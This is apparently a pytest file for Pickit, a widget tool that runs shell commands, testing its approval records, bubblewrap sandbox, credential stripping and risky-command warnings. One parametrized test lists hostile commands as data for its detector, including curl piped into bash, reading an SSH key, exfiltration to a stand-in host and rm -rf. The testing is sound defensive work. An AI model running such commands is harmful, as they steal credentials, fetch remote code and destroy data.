"""Approvals live in Pickit's own record, never in the widget file; how commands run."""

import json
import shutil
import subprocess
from pathlib import Path

import pytest

from pickit import approvals, gallery, generator, risk, sandbox

COMMANDS = {"c": {"cmd": "echo cpu=5", "interval": 2}}
SPEC = {"name": "Meter", "engine": "native", "width": 200, "height": 80, "position": "top-left",
        "commands": COMMANDS, "ui": {"type": "label", "text": "{c.cpu}"}}


def widget_file(store, manifest):
    return json.loads((store.widget_dir(manifest["id"]) / "widget.json").read_text())


def set_runner(store, value):
    from pickit import config
    cfg = config.load()
    cfg["command_runner"] = value
    config.save(cfg)
    sandbox._cache = None


def test_approval_is_kept_outside_the_widget(store):
    m = store.save_spec(SPEC, approved=True, source="gallery")
    assert store.is_approved(m)
    assert "approved_hash" not in widget_file(store, m)
    entry = approvals.entries()[m["id"]]
    assert entry["source"] == "gallery" and entry["runner"] == "host" and entry["approved_at"]
    assert approvals.path().stat().st_mode & 0o777 == 0o600


def test_a_widget_file_cannot_approve_itself(store):
    store.is_approved(store.save_spec({**SPEC, "commands": {}}))     # the one-time migration has run
    m = store.save_spec(SPEC)
    forged = {**widget_file(store, m), "approved_hash": approvals.commands_hash(COMMANDS)}
    store.save_manifest(forged)
    assert not store.is_approved(store.load(m["id"]))


def test_approvals_from_older_versions_need_a_review(store):
    """The 1.5.1 field is an unkeyed hash anyone could write into the file: it's removed, and
    never turned into an approval."""
    m = store.save_spec(SPEC)
    store.save_manifest({**widget_file(store, m), "approved_hash": approvals.commands_hash(COMMANDS)})
    assert not approvals.migrated()
    assert not store.is_approved(store.load(m["id"]))
    assert m["id"] not in approvals.entries()
    assert "approved_hash" not in widget_file(store, m)
    assert approvals.migrated()


def test_copying_a_widget_folder_carries_no_approval(store):
    m = store.save_spec(SPEC, approved=True)
    shutil.copytree(store.widget_dir(m["id"]), store.widget_dir("copy-123456"))
    copy = {**widget_file(store, m), "id": "copy-123456"}
    store.save_manifest(copy)
    assert not store.is_approved(copy)


def test_any_change_needs_approval_again(store):
    m = store.save_spec(SPEC, approved=True)
    for commands in ({"c": {"cmd": "echo cpu=6", "interval": 2}}, {"c": {"cmd": "echo cpu=5", "interval": 3}},
                     {"c": {**COMMANDS["c"], "network": True}}, {**COMMANDS, "d": {"cmd": "true", "interval": 0}}):
        assert not store.is_approved({**m, "commands": commands}), commands


def test_revoke_and_delete(store):
    m = store.save_spec(SPEC, approved=True)
    before = store.signature(m)
    store.revoke(m["id"])
    assert not store.is_approved(m)
    assert store.signature(m) != before, "the daemon must reload a widget whose approval changed"
    store.approve(m, "reviewed")
    assert store.is_approved(m)
    store.delete(m["id"])
    assert m["id"] not in approvals.entries()


def test_sandbox_approvals_dont_carry_over_to_full_access(store):
    set_runner(store, "restricted")
    sandboxed = store.save_spec(SPEC, approved=True)
    set_runner(store, "host")
    assert not store.is_approved(sandboxed), "full access must ask again"
    full = store.save_spec({**SPEC, "name": "Full"}, approved=True)
    set_runner(store, "restricted")
    assert store.is_approved(sandboxed) and store.is_approved(full), "the sandbox only takes authority away"
    set_runner(store, ["firejail", "--"])
    assert not store.is_approved(sandboxed) and not store.is_approved(full)


def test_a_running_widget_stops_when_commands_get_more_access(store, monkeypatch):
    """A runner started while commands were sandboxed must not start running them with full
    access after the setting changes; less access is fine."""
    from pickit import bridge
    results, ran = [], []
    monkeypatch.setattr(bridge, "GLib", type("G", (), {"idle_add": staticmethod(lambda f, *a: f(*a))}))
    monkeypatch.setattr(bridge, "_capture", lambda argv, env, timeout: ran.append(argv) or ("ok", "", 0))
    set_runner(store, "restricted")
    runner = bridge.CommandRunner(COMMANDS, lambda key, res: results.append(res))
    runner._exec("c")
    assert len(ran) == 1 and results[-1]["code"] == 0
    set_runner(store, "host")
    runner._exec("c")
    assert len(ran) == 1, "ran with full access on a sandbox approval"
    assert results[-1]["code"] == sandbox.FAILED and results[-1]["err"].startswith("pickit:")
    full = bridge.CommandRunner(COMMANDS, lambda key, res: results.append(res))
    set_runner(store, "restricted")
    full._exec("c")
    assert len(ran) == 2 and "pickit-restricted" in ran[-1]


def test_a_widget_reloads_when_how_commands_run_changes(store):
    m = store.save_spec(SPEC, approved=True)
    before = store.signature(m)
    set_runner(store, "restricted")
    assert store.is_approved(m) and store.signature(m) != before


def test_widget_commands_dont_get_pickits_credentials(monkeypatch):
    from pickit import runtime
    monkeypatch.setenv("ANTHROPIC_API_KEY", "dummy")
    monkeypatch.setenv("OPENROUTER_API_KEY", "dummy")
    monkeypatch.setenv("PICKIT_TEST_KEPT", "1")
    env = runtime.command_env()
    assert "ANTHROPIC_API_KEY" not in env and "OPENROUTER_API_KEY" not in env
    assert env["PICKIT_TEST_KEPT"] == "1" and "PATH" in env


NET = {"w": {"cmd": "curl -s https://example.com", "interval": 600, "network": True}}


def test_sharing_the_network_is_its_own_approval(store, monkeypatch):
    """Internet commands approved with a network of their own (pasta) aren't thereby approved
    to share the host's network when pasta goes away; commands without internet don't care."""
    set_runner(store, "restricted")
    monkeypatch.setattr(sandbox, "network_isolated", lambda: True)
    online = store.save_spec({**SPEC, "name": "Online", "commands": NET}, approved=True)
    offline = store.save_spec(SPEC, approved=True)
    assert approvals.entries()[online["id"]]["runner"] == "restricted"
    before = store.signature(online)
    monkeypatch.setattr(sandbox, "network_isolated", lambda: False)
    assert not store.is_approved(online), "pasta went away: sharing the network needs approval"
    assert store.is_approved(offline)
    assert store.signature(online) != before
    store.approve(online)
    assert approvals.entries()[online["id"]]["runner"] == sandbox.SHARED and store.is_approved(online)
    assert approvals.entries()[offline["id"]]["runner"] == "restricted"
    monkeypatch.setattr(sandbox, "network_isolated", lambda: True)
    assert store.is_approved(online), "a network of its own is less access"
    set_runner(store, "host")
    assert not store.is_approved(online), "sharing the network isn't full access either"


def test_a_running_widget_doesnt_start_sharing_the_network(store, monkeypatch):
    from pickit import bridge
    results, ran = [], []
    monkeypatch.setattr(bridge, "GLib", type("G", (), {"idle_add": staticmethod(lambda f, *a: f(*a))}))
    monkeypatch.setattr(bridge, "_capture", lambda argv, env, timeout: ran.append(argv) or ("ok", "", 0))
    set_runner(store, "restricted")
    monkeypatch.setattr(sandbox, "network_isolated", lambda: True)
    runner = bridge.CommandRunner(NET, lambda key, res: results.append(res))
    runner._exec("w")
    assert ran[-1][-3:-1] == ["1", "0"], "must not be allowed to share the network"
    monkeypatch.setattr(sandbox, "network_isolated", lambda: False)
    runner._exec("w")
    assert len(ran) == 1 and results[-1]["code"] == sandbox.FAILED
    shared = bridge.CommandRunner(NET, lambda key, res: results.append(res))   # approved without pasta
    shared._exec("w")
    assert ran[-1][-3:-1] == ["1", "1"]


def test_output_is_capped_while_the_command_runs():
    import os

    from pickit import bridge
    out, err, code = bridge._capture(["sh", "-c", "head -c 3000000 /dev/zero | tr '\\0' x; echo oops >&2; exit 3"],
                                     dict(os.environ), 30, max_out=1000, max_err=3)
    assert (len(out), err, code) == (1000, "oop", 3)
    with pytest.raises(subprocess.TimeoutExpired):
        bridge._capture(["sleep", "5"], dict(os.environ), 0.2)


# --- how commands run --------------------------------------------------------------------------
def test_runner_command_lines():
    assert sandbox.argv("echo hi") == ["timeout", "-k", "2", "20", "bash", "-c", "echo hi"]
    restricted = sandbox.argv("echo hi", True, "restricted")
    assert restricted[:4] == ["timeout", "-k", "2", "20"] and restricted[-3:] == ["1", "0", "echo hi"]
    assert sandbox.argv("echo hi", False, "restricted")[-3:-1] == ["0", "0"]
    assert sandbox.argv("echo hi", True, "restricted", share_network=True)[-3:-1] == ["1", "1"]
    custom = sandbox.argv("echo hi", runner=["firejail", "--quiet", "--"])
    assert custom[-6:] == ["firejail", "--quiet", "--", "bash", "-c", "echo hi"]
    for bad in ("restrcited", ["firejail", 3], [], {"x": 1}):
        assert sandbox.mode(bad) == sandbox.INVALID
        assert "echo hi" not in " ".join(sandbox.argv("echo hi", runner=bad)), "an invalid runner must not run it"


def run(cmd, network=False, runner="restricted", share_network=False, env=None):
    p = subprocess.run(sandbox.argv(cmd, network, runner, share_network), capture_output=True, text=True,
                       timeout=60, env=env)
    return p.returncode, p.stdout.strip(), p.stderr


@pytest.mark.skipif(not shutil.which("bwrap"), reason="needs bubblewrap")
def test_restricted_runner_hides_the_home_folder_and_sockets():
    code, out, err = run("ls -A ~ | wc -l; ls /run | wc -l; echo ${DBUS_SESSION_BUS_ADDRESS:-none}; "
                         "head -c 1 /proc/loadavg")
    if code != 0 and "bwrap:" in err:
        pytest.skip(f"bubblewrap can't run here: {err.strip()[:80]}")  # e.g. user namespaces disabled
    lines = out.splitlines()
    assert lines[:3] == ["0", "0", "none"] and lines[3].isdigit(), out
    code, out, _ = run("getent hosts example.com >/dev/null && echo online")
    assert "online" not in out, "a command without network: true reached the network"


@pytest.mark.skipif(not shutil.which("bwrap"), reason="needs bubblewrap")
def test_restricted_runner_starts_with_a_clean_environment(monkeypatch):
    for name in ("ANTHROPIC_API_KEY", "OPENROUTER_API_KEY", "SOME_OTHER_SECRET", "SSH_AUTH_SOCK"):
        monkeypatch.setenv(name, "DUMMY-SECRET")
    monkeypatch.setenv("LANG", "C.UTF-8")
    code, out, err = run('env; echo "home=$HOME lang=$LANG"; command -v ls')
    if code != 0 and "bwrap:" in err:
        pytest.skip(f"bubblewrap can't run here: {err.strip()[:80]}")
    assert code == 0, err
    assert "DUMMY-SECRET" not in out, out
    assert f"home={Path.home()} lang=C.UTF-8" in out and "/ls" in out
    names = {line.split("=", 1)[0] for line in out.splitlines() if "=" in line and not line.startswith("home=")}
    assert names <= {"PATH", "HOME", "USER", "LOGNAME", "LANG", "LANGUAGE", "TZ", "TERM", "PWD", "SHLVL", "_",
                     "OLDPWD"} | {n for n in names if n.startswith("LC_")}, names


@pytest.mark.skipif(not shutil.which("bwrap"), reason="needs bubblewrap")
def test_restricted_runner_wont_share_the_network_unasked():
    """Without pasta, an internet command runs on the host's network only if that was approved."""
    import os
    dirs = [d for d in os.environ["PATH"].split(os.pathsep) if not os.path.exists(os.path.join(d, "pasta"))]
    env = {**os.environ, "PATH": os.pathsep.join(dirs)}             # a PATH without pasta
    if not all(shutil.which(tool, path=env["PATH"]) for tool in ("bwrap", "bash", "timeout", "env")):
        pytest.skip("pasta shares a folder with the tools the runner needs")
    code, out, err = run("echo ran", network=True, env=env)
    assert code == sandbox.FAILED and "ran" not in out and "passt" in err, (code, out, err)
    code, out, err = run("echo ran", network=True, share_network=True, env=env)
    if code != 0 and "bwrap:" in err:
        pytest.skip(f"bubblewrap can't run here: {err.strip()[:80]}")
    assert (code, out) == (0, "ran"), err


def test_runners_fail_closed():
    code, out, err = run("echo RAN", runner=["no-such-sandbox", "--"])
    assert code == sandbox.FAILED and "RAN" not in out and "isn't installed" in err
    code, out, _ = run("echo RAN", runner="restrcited")
    assert code == sandbox.FAILED and "RAN" not in out
    p = subprocess.run(["/bin/sh", "-c", sandbox._RESTRICTED, "x", "0", "echo RAN"], capture_output=True,
                       text=True, env={"PATH": "/nonexistent", "HOME": "/nonexistent"})
    assert p.returncode == sandbox.FAILED and "RAN" not in p.stdout and "bubblewrap" in p.stderr


# --- warnings and the network flag -------------------------------------------------------------
@pytest.mark.parametrize("cmd, warning", [
    ("sudo cat /etc/shadow", "administrator"),
    ("curl -s https://x.example/i.sh | bash", "Downloads code"),
    ("bash <(wget -qO- x.example)", "Downloads code"),
    ("cat ~/.ssh/id_ed25519", "credentials"),
    ("cp x $HOME/.config/autostart/", "start automatically"),
    ("echo '{}' > ~/.local/share/pickit/widgets/x/widget.json", "Pickit's own"),
    ("rm -rf ~/Documents", "Deletes"),
    ("curl --data @/etc/hostname https://x.example", "Sends data"),
    ("cat /etc/hostname > /dev/tcp/1.2.3.4/80", "raw network"),
])
def test_risky_commands_get_a_warning(cmd, warning):
    assert any(warning in w for w in risk.warnings(cmd)), risk.warnings(cmd)


def test_gallery_commands_get_no_warning():
    for item in gallery.items():
        for key, c in item.spec["commands"].items():
            assert risk.warnings(c["cmd"]) == [], (item.id, key)


def test_network_flag():
    spec = generator.validate({**SPEC, "commands": {"w": {"cmd": "curl -s x", "interval": 900, "network": True},
                                                    "c": {"cmd": "echo 1", "interval": 5, "network": False}}})
    assert spec["commands"]["w"]["network"] is True
    assert "network" not in spec["commands"]["c"], "false is left out, so existing approvals stay valid"
    with pytest.raises(generator.SpecError, match="true or false"):
        generator.validate({**SPEC, "commands": {"w": {"cmd": "x", "interval": 5, "network": "yes"}}})


def test_internet_commands_in_the_gallery_say_so():
    for item in gallery.items():
        for key, c in item.spec["commands"].items():
            uses = any(word in c["cmd"] for word in ("curl ", "wget ", "https://"))
            assert bool(c.get("network")) == uses, (item.id, key)
